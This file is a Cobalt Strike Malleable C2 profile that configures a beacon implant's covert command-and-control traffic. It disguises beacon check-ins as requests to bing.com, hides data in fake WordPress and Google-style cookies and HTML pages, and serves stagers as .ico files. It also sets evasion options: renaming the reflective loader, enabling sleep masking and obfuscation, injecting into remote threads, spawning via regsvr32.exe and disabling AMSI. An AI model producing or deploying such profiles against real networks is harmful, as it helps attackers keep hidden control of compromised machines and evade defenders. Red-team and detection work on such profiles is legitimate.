set sample_name "5d93e051";
set sleeptime "56112";
set jitter "39";
set tcp_port "7722";
set useragent "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0";

set dns_idle "4.64.76.219";
set dns_stager_subhost "ns0.";
set maxdns "246";
set dns_sleep "145";
set dns_ttl "3600";
set dns_max_txt "252";

set pipename "halfduplex_##";
set pipename_stager "rpc_##";

http-config {
	header "Server" "Pagely Gateway/1.5.1";
}

http-get "default" {

	set uri "/mk /ba /br";

	client {

		header "Host" "bing.com";
		header "Connection" "close";
		header "Accept" "image/*";

		metadata {
			mask;
			base64;
			prepend "wp_woocommerce_session_=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "ESF";

		output {
			netbios;
			base64;
			prepend "<!DOCTYPE html><!--[if IE 7]><html class='ie ie7' lang='en-US'><![endif]--><!--[if IE 8]><html class='ie ie8' lang='en-US'><![endif]--><!--[if !(IE 7) | !(IE 8)  ]><!--><html lang='en-US'><!--<![endif]-->    <head>        <meta charset='UTF-8' />        <meta name='viewport' content='width=device-width' />        <title>            Official Website        </title>        <meta name='description' content='Official Website' />        <meta name='keywords' content='Entertainment' />                    <meta property='og:title' content='' />            <meta property='og:url' content='https://www.";
			print;
		}

	}

}
http-post "default" {

	set uri "/ak /ki";

	client {

		header "Host" "bing.com";
		header "Connection" "close";
		header "Content-Type" "text/plain";

		output {
			netbios;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "cloudflare";

		output {
			base64;
			print;
		}

	}

}
http-stager "default" {

	set uri_x86 "/static-directory/mk.ico";
	set uri_x64 "/static-directory/mk.ico";

	client {

		header "Host" "bing.com";
		header "Connection" "close";
		header "Accept-Language" "en-US";

	}
	server {

		header "Content-Type" "image/x-icon";
		header "Server" "Pagely Gateway/1.5.1";
		header "Connection" "close";

		output {
			print;
		}

	}

}
stage {

	set checksum "7";
	set userwx "false";
	set image_size_x86 "525478";
	set image_size_x64 "569567";
	set sleep_mask "true";
	set cleanup "true";
	set stomppe "true";
	set obfuscate "true";
	set compile_time "01 Dec 2020 14:15:23";
	set entry_point "88446";
	set name "networkcomm.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "NetworkComm";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "NetworkComm";
	}

}

process-inject {

	set allocator "VirtualAllocEx";
	set min_alloc "11423";
	set userwx "false";
	set startrwx "false";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90\x90";
	}
	transform-x64 {
		prepend "\x90\x90\x90\x90\x90\x90";
	}

	execute {
		CreateThread;
		RtlCreateUserThread;
		CreateRemoteThread;
	}

}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\regsvr32.exe";
	set spawnto_x64 "%windir%\\sysnative\\regsvr32.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}

http-get "variant_1" {

	set uri "/ak /tab_shop /na";

	client {

		header "Host" "bing.com";
		header "Connection" "close";

		metadata {
			base64;
			base64;
			prepend "HSID=";
			header "Cookie";
		}

		parameter "apply" "false";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "ESF";

		output {
			mask;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "variant_1" {

	set uri "/sitemap";

	client {

		header "Host" "bing.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip";
		header "Content-Type" "application/x-www-form-urlencoded";

		output {
			base64url;
			base64;
			prepend "previewed=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Apache";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_1" {

	set uri_x86 "/components/as.ico";
	set uri_x64 "/wp-includes/case.ico";

	client {

		header "Host" "bing.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip, br";

	}
	server {

		header "Content-Type" "image/x-icon";
		header "Server" "ESF";
		header "Connection" "close";

		output {
			print;
		}

	}

}
